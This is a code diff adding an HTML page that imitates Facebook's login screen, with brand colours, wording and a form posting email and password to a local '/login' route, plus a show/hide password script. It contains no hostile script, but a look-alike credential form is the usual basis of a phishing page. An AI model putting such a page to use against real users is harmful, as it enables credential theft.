@@ -1,4 +1,213 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Facebook Login</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
 
+        body {
+            font-family: Arial, sans-serif;
+            background-color: #f0f2f5;
+        }
+
+        .container {
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+        }
+
+        .login-box {
+            background-color: white;
+            padding: 40px;
+            border-radius: 8px;
+            box-shadow: 0px 4px 12px rgba(0, 0, 0, 0.1);
+            max-width: 400px;
+            width: 100%;
+        }
+
+        .login-box h1 {
+            color: #1877f2;
+            font-size: 2rem;
+            font-weight: bold;
+            text-align: center;
+            margin-bottom: 20px;
+        }
+
+        .login-box input[type="text"],
+        .login-box input[type="password"] {
+            width: 100%;
+            padding: 15px;
+            font-size: 16px;
+            margin: 10px 0;
+            border: 1px solid #dddfe2;
+            border-radius: 6px;
+            outline: none;
+            position: relative;
+        }
+
+        .password-container {
+            position: relative;
+            width: 100%;
+        }
+
+        .show-hide {
+            position: absolute;
+            right: 15px;
+            top: 50%;
+            transform: translateY(-50%);
+            cursor: pointer;
+            color: #1877f2;
+            font-weight: bold;
+            font-size: 14px;
+            display: none; /* Initially hidden */
+            background-color: transparent;
+            border: none;
+            outline: none;
+        }
+
+        .login-box input[type="submit"] {
+            width: 100%;
+            padding: 15px;
+            font-size: 16px;
+            color: white;
+            background-color: #1877f2;
+            border: none;
+            border-radius: 6px;
+            cursor: pointer;
+            font-weight: bold;
+            margin-top: 10px;
+        }
+
+        .login-box input[type="submit"]:hover {
+            background-color: #165dc1;
+        }
+
+        .forgot-password {
+            display: block;
+            text-align: center;
+            margin: 15px 0;
+            color: #1877f2;
+            font-size: 14px;
+            text-decoration: none;
+        }
+
+        .divider {
+            text-align: center;
+            margin: 15px 0;
+            position: relative;
+            font-size: 12px;
+            color: #aaa;
+        }
+
+        .divider::before,
+        .divider::after {
+            content: "";
+            position: absolute;
+            top: 50%;
+            width: 40%;
+            height: 1px;
+            background-color: #dddfe2;
+        }
+
+        .divider::before {
+            left: 0;
+        }
+
+        .divider::after {
+            right: 0;
+        }
+
+        .create-account {
+            width: 100%;
+            padding: 15px;
+            font-size: 16px;
+            color: white;
+            background-color: #42b72a;
+            border: none;
+            border-radius: 6px;
+            cursor: pointer;
+            font-weight: bold;
+        }
+
+        .create-account:hover {
+            background-color: #36a420;
+        }
+
+        footer {
+            text-align: center;
+            font-size: 12px;
+            margin-top: 20px;
+            color: #777;
+        }
+
+        footer a {
+            color: #777;
+            text-decoration: none;
+        }
+
+        footer a:hover {
+            text-decoration: underline;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <div class="login-box">
+            <h1>Facebook</h1>
+            <form action="/login" method="POST">
+                <input type="text" name="email_or_phone" placeholder="Email or phone number" required>
+                
+                <div class="password-container">
+                    <input type="password" id="password" name="password" placeholder="Password" required>
+                    <button type="button" id="togglePassword" class="show-hide">Show</button>
+                </div>
+
+                <input type="submit" value="Log In">
+            </form>
+            <a href="#" class="forgot-password">Forgotten password?</a>
+            <div class="divider">or</div>
+            <button class="create-account">Create New Account</button>
+        </div>
+    </div>
+
+    <footer>
+        <p>
+            <a href="#">Create a Page</a> for a celebrity, brand or business.
+        </p>
+    </footer>
+
+    <script>
+        const passwordInput = document.getElementById("password");
+        const togglePassword = document.getElementById("togglePassword");
+
+        // Show/hide the "Show" button based on input in password field
+        passwordInput.addEventListener("input", function () {
+            if (passwordInput.value.length > 0) {
+                togglePassword.style.display = "inline";
+            } else {
+                togglePassword.style.display = "none";
+            }
+        });
+
+        // Toggle password visibility and "Show"/"Hide" text
+        togglePassword.addEventListener("click", function () {
+            const isPasswordVisible = passwordInput.type === "text";
+            passwordInput.type = isPasswordVisible ? "password" : "text";
+            togglePassword.textContent = isPasswordVisible ? "Show" : "Hide";
+        });
+    </script>
+</body>
+</html>
+
+
+<!-- 
 <!DOCTYPE html>
 <html lang="en">
 <head>
@@ -203,3 +412,4 @@
 </body>
 </html>
 
+ -->
